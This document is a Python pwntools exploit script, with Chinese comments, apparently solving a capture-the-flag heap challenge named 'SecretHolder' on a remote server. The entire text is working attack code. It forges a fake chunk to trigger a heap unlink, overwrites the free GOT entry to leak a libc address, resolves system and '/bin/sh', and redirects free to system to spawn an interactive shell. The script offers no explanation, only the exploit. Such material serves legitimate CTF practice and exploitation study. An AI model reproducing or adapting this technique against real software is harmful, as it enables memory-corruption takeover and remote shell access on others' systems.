
from pwn import *
from LibcSearcher import *
 
# sh = process('./SecretHolder')
sh = remote('111.200.241.244',49895)
elf = ELF('./SecretHolder')
#huge_secret指针的地址
huge_secret = 0x6020A8
bss_addr = 0x602090
free_got = elf.got['free']
puts_plt = elf.plt['puts']
read_got = elf.got['read']
 
def new(h_type,content):
   sh.sendlineafter('3. Renew secret','1')
   sh.sendlineafter('3. Huge secret',str(h_type))
   sh.sendlineafter('Tell me your secret:',content)
 
def delete(h_type):
   sh.sendlineafter('3. Renew secret','2')
   sh.sendlineafter('3. Huge secret',str(h_type))
 
def edit(h_type,content):
   sh.sendlineafter('3. Renew secret','3')
   sh.sendlineafter('3. Huge secret',str(h_type))
   sh.sendafter('Tell me your secret:',content)
 
#申请一个大chunk
new(3,'a'*0x100)
delete(3)
 
#申请一个小chunk
new(1,'b'*0x10)
#申请一个中等chunk
new(2,'c'*0x100)
 
#释放chunk0和chunk1
delete(1)
delete(2)
 
#构造假chunk
fake_chunk = p64(0) + p64(0x21)
#fd,bk
fake_chunk += p64(huge_secret-0x18) + p64(huge_secret-0x10)
payload = fake_chunk.ljust(0x20,'\x00')
#prev_size size
payload += p64(0x20) + p64(0x90) + 'c'*0x80 #chunk2
#prev_size size
payload += p64(0x90) + p64(0x81) + 'd'*0x70 #chunk3
#prev_size size
payload += p64(0) + p64(0x81) #chunk4
#重新申请large chunk，使得分配到的位置与chu
new(3,payload)
 
#unlink 3这个large bin
delete(2)
#现在，我们可以自由控制三个堆指针了，先修改三个堆指针
payload = p64(0) * 2 + p64(free_got) + p64(bss_addr) + p64(read_got) + p32(1)*3
edit(3,payload)
 
#修改free的got表为puts的plt
edit(2,p64(puts_plt))
#泄露read的地址
delete(1)
sh.recvuntil('\n')
read_addr = u64(sh.recvuntil('\n',drop = True).ljust(8,'\x00'))
libc = LibcSearcher('read',read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
print 'libc_base=',hex(read_addr)
print 'system_addr=',hex(system_addr)
#修改free的got表内容，指向system
edit(2,p64(system_addr))
#修改堆1指针，指向/bin/sh字符串
edit(3,p64(0) * 2 + p64(binsh_addr))
#system("/bin/sh")
delete(2)
 
sh.interactive()
